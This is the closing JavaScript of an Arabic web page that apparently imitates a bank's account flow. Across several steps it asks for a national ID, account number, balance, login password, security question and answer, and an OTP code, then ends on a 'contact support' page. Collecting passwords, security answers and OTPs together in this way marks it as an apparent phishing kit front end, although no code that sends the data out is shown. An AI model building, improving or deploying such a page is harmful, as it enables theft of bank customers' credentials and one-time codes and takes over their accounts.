  <script>
    let timerInterval;

    // تنسيق دخل المبلغ بالفواصل تلقائياً أثناء الكتابة مثل بنكك
    const balanceInput = document.getElementById('balance');
    balanceInput.addEventListener('input', function (e) {
      let value = this.value.replace(/[^0-9]/g, '');
      if (value) {
        this.value = parseInt(value, 10).toLocaleString('en-US');
      } else {
        this.value = '';
      }
    });

    // Auto-Tab Script & إزالة التحديد عند الكتابة
    document.querySelectorAll('input, select').forEach(element => {
      element.addEventListener('input', () => element.classList.remove('input-error'));
      element.addEventListener('change', () => element.classList.remove('input-error'));
    });

    document.querySelectorAll('.auto-tab-container').forEach(container => {
      const inputs = Array.from(container.querySelectorAll('input'));

      inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
          const maxLength = parseInt(input.getAttribute('maxlength')) || 1;
          if (input.value.length >= maxLength) {
            if (index < inputs.length - 1) {
              inputs[index + 1].focus();
            }
          }
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && input.value.length === 0) {
            if (index > 0) {
              inputs[index - 1].focus();
            }
          }
        });
      });
    });

    // التحكم في اختيار نوع حساب واحد فقط
    const accountTypeCBs = document.querySelectorAll('.account-type-cb');
    accountTypeCBs.forEach(cb => {
      cb.addEventListener('click', function(e) {
        if (this.checked) {
          accountTypeCBs.forEach(otherCb => {
            if (otherCb !== this && otherCb.checked) {
              e.preventDefault();
              this.checked = false;
              alert('يرجى إلغاء تحديد المربع الأول أولاً لاختيار نوع حساب آخر.');
            }
          });
        }
      });
    });

    // دالة فحص وتحديد الحقول المربعة الفارغة
    function checkAndHighlightBoxes(containerId) {
      const inputs = document.querySelectorAll(`#${containerId} input`);
      let allFilled = true;
      let firstEmpty = null;

      inputs.forEach(input => {
        if (input.value.trim() === '') {
          input.classList.add('input-error');
          allFilled = false;
          if (!firstEmpty) firstEmpty = input;
        } else {
          input.classList.remove('input-error');
        }
      });

      if (firstEmpty) firstEmpty.focus();
      return allFilled;
    }

    // دالة فحص وتحديد المدخلات العادية
    function validateField(elementId) {
      const el = document.getElementById(elementId);
      if (!el.value.trim()) {
        el.classList.add('input-error');
        el.focus();
        return false;
      }
      el.classList.remove('input-error');
      return true;
    }

    function goToPage2() {
      let isValid = true;

      // 1. الشروط والأحكام
      const termsBox = document.getElementById('terms-container');
      const termsCb = document.getElementById('terms');
      if (!termsCb.checked) {
        termsBox.classList.add('input-error');
        termsBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
        isValid = false;
      } else {
        termsBox.classList.remove('input-error');
      }

      // 2. رقم الهوية
      if (!checkAndHighlightBoxes('id-no-container')) isValid = false;

      // 3. البيانات الشخصية
      if (!validateField('mobile-no')) isValid = false;
      if (!validateField('english-name')) isValid = false;
      if (!validateField('arabic-name')) isValid = false;

      // 4. نوع الحساب
      const accountTypes = document.querySelectorAll('.account-type-cb');
      let accountTypeSelected = Array.from(accountTypes).some(cb => cb.checked);
      if (!accountTypeSelected) {
        alert('يرجى اختيار نوع الحساب.');
        isValid = false;
      }

      // 5. التاريخ والفرع والرصيد
      if (!checkAndHighlightBoxes('date-container')) isValid = false;
      if (!validateField('branch')) isValid = false;
      if (!validateField('balance')) isValid = false;

      // 6. رقم الحساب
      if (!checkAndHighlightBoxes('account-no-container')) isValid = false;

      if (!isValid) {
        alert('يرجى تعبئة الخانات المحددة باللون الأحمر.');
        return;
      }

      document.getElementById('page1').classList.add('hidden');
      document.getElementById('page2').classList.remove('hidden');
      document.getElementById('header-subtitle').innerText = "تسجيل الدخول";
      window.scrollTo(0, 0);
    }

    // التعديل الرئيسي في دالة الانتقال للصفحة الثالثة
    function goToPage3() {
      let isValid = true;
      const passEl = document.getElementById('login-pass');
      const passVal = passEl.value;

      if (!validateField('login-acc')) isValid = false;
      if (!validateField('login-pass')) isValid = false;

      if (!isValid) {
        alert('يرجى إدخال البيانات المحددة بالأحمر.');
        return;
      }

      // التحقق من وجود أرقام ورموز وحروف في كلمة المرور
      const hasLetter = /[a-zA-Z\u0600-\u06FF]/.test(passVal);
      const hasNumber = /[0-9]/.test(passVal);
      const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(passVal);

      if (!hasLetter || !hasNumber || !hasSpecialChar) {
        passEl.classList.add('input-error');
        passEl.focus();
        alert('كلمة المرور يجب أن تحتوي على حروف وأرقام ورموز خاصة (مثل: Almezmose123@#)');
        return;
      }

      document.getElementById('page2').classList.add('hidden');
      document.getElementById('page3').classList.remove('hidden');
      document.getElementById('header-subtitle').innerText = "تأكيد الهاتف";
      window.scrollTo(0, 0);
    }

    function goToPage4() {
      if (!validateField('verify-phone')) {
        alert('يرجى إدخال رقم الهاتف.');
        return;
      }

      document.getElementById('page3').classList.add('hidden');
      document.getElementById('page4').classList.remove('hidden');
      document.getElementById('header-subtitle').innerText = "أسئلة الأمان";
      window.scrollTo(0, 0);
    }

    function goToPage5() {
      let isValid = true;
      if (!validateField('sec-answer')) isValid = false;
      if (!validateField('sec-question')) isValid = false;

      if (!isValid) {
        alert('يرجى اختيار سؤال الأمان وإجابتة.');
        return;
      }

      document.getElementById('page4').classList.add('hidden');
      document.getElementById('page5').classList.remove('hidden');
      document.getElementById('header-subtitle').innerText = "رمز التحقق OTP";
      window.scrollTo(0, 0);
      startTimer();
    }

    function startTimer() {
      clearInterval(timerInterval);
      let totalSeconds = 59 * 60; 
      const timerElement = document.getElementById('timer');
      const resendBtn = document.getElementById('resend-btn');

      resendBtn.classList.add('hidden');

      timerInterval = setInterval(() => {
        totalSeconds--;
        
        let minutes = Math.floor(totalSeconds / 60);
        let seconds = totalSeconds % 60;

        let formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
        let formattedSeconds = seconds < 10 ? "0" + seconds : seconds;

        timerElement.innerText = formattedMinutes + ":" + formattedSeconds;

        if (totalSeconds <= 0) {
          clearInterval(timerInterval);
          timerElement.innerText = "انتهت المهلة";
          resendBtn.classList.remove('hidden');
        }
      }, 1000);
    }

    function finishProcess() {
      if (!validateField('otp-input')) {
        alert("يرجى إدخال رمز التحقق (OTP).");
        return;
      }
      clearInterval(timerInterval);
      document.getElementById('page5').classList.add('hidden');
      document.getElementById('page6').classList.remove('hidden');
      document.getElementById('header-subtitle').innerText = "إتمام العملية";
      window.scrollTo(0, 0);
    }

    function goToPage7() {
      document.getElementById('page6').classList.add('hidden');
      document.getElementById('page7').classList.remove('hidden');
      document.getElementById('header-subtitle').innerText = "التواصل مع الدعم";
      window.scrollTo(0, 0);
    }
  </script>

</body>
</html>
